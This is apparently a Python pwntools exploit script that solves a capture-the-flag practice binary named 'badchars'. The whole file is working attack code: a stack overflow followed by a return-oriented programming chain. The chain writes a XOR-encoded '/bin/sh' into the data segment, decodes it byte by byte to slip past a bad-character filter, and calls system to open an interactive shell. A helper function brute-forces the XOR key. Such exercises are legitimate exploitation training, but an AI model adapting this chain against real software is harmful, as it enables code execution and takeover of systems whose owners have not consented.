from pwn import *

context(terminal = ["tmux", "new-window"])

#p = gdb.debug("./badchars", gdbscript = '''
#init-peda
#b *0x400984
#''')

p = process("./badchars")

context.log_level = "DEBUG"
sh = "/bin/sh\x00"
def helper_function(string):
    badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
    for i in xrange(255):
        flag = True
        # 8 loops, for 8 bytes we concat the result of xor
        new_str = "".join([chr(i^ord(string[x])) for x in xrange(len(string))])
        # now, we loop through all 8 bytes of bad chars and if it's found in
        # new string, we ignore it
        for b in badchars:
            if chr(b) in new_str:
                flag = False
        #If we made it past the bad character check, we print out the result and exit
        if flag:
            print ("^"+str(i))
            print (new_str.encode('hex'))
            exit()
#helper_function(sh) # we used this function, and looked like xor'ing with 2 might do the job
xored_sh = p64(0x2d606b6c2d716a02, endianness="big")
pop_r14_r15 = p64(0x400b40)
pop_r12_r13 = p64(0x400b3b)
mov_r13_r12 = p64(0x400b34) # mov qword ptr [r13], r12 ; ret
xor_r15_r14b = p64(0x400b30) # xor byte ptr [r15], r14b ; ret
pop_rdi = p64(0x400b39)
data_seg = p64(0x601050)
sys = p64(0x4006f0)

junk = "A"*40

payload = junk + pop_r12_r13 + xored_sh + data_seg + mov_r13_r12
for i in xrange(8):
    payload += pop_r14_r15
    payload += p64(2)
    payload += p64(u64(data_seg)+i)
    payload += xor_r15_r14b

payload = payload + pop_rdi + data_seg + sys
p.recvuntil("> ")
p.sendline(payload)
p.interactive()
